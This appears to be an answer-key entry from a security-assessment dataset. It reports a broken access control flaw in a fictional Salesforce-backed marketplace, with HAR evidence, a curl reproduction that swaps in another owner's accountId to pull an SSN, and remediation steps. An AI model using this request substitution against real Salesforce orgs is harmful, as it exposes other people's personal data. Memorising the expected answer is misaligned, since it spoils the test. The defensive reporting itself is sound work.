# Expected Response

## System
- **Domain:** E-Commerce / Marketplace (Salesforce-Integrated)
- **System:** ShopGrid Marketplace API (Salesforce-Integrated)
- **Example ID:** SF-0003

## Priority Findings

### Finding 1: E-Commerce Salesforce — BAC Functional Pivot via Aura getAccounts Exposes Cross-Ownership Account Records (Pattern 2.1)
**Severity:** High
**Category:** Broken Access Control / Functional Pivot (Vertical/Horizontal)

**Summary:**
Per §4.0 (RISK-SF-003/RISK-SF-004): The `AccountController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check (`AND OwnerId = UserInfo.getUserId()`). Per §5.0 (Pattern 2.1 — functional pivot/vertical/horizontal): an attacker can pivot horizontally between records belonging to other users by substituting the `accountId` in the Aura action, effectively performing a functional pivot attack. An attacker submitted `c.AccountController.getAccounts` with `accountId: "0010CD6"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-55-7150"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In E-Commerce, exposure of customer SSNs and internal account notes enables identity theft and fraud.

**Evidence from HAR:**
- Request: `POST https://5ccd0cd6.lightning.force.com/aura`
- Aura action descriptor: `c.AccountController.getAccounts`
- `aura.token`: `undefined`
- Params: `accountId: "0010CD6"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "0010CD6"`, `Name: "Victim Account Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-55-7150"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-003 | AccountController declared `without sharing` |
| context.txt §4.0 | RISK-SF-004 | SOQL missing ownership check |
| context.txt §5.0 | Pattern 2.1 | Functional pivot — horizontal BAC via accountId substitution |
| HAR request | params.accountId | 0010CD6 — arbitrary victim account ID |
| HAR response | SensitiveData__c | SSN: 000-55-7150 (PII) |
| HAR response | OwnerId | 005VICTIM (horizontal pivot confirmed) |

## Steps to Reproduce

### Step 1 — Aura accountId substitution functional pivot (HAR)
```bash
curl -s -X POST 'https://5ccd0cd6.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"0010CD6","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim account record including `SSN: 000-55-7150`. **Secure:** FORBIDDEN — `with sharing` enforced; SOQL restricted to `OwnerId = UserInfo.getUserId()`.

## Remediation
1. Declare `AccountController` as `with sharing`.
2. Add `AND OwnerId = :UserInfo.getUserId()` to the SOQL WHERE clause.
3. Validate `aura.token` as a valid session before processing Aura actions.
4. Define a server-side field allowlist; reject client-supplied `fields` parameter.
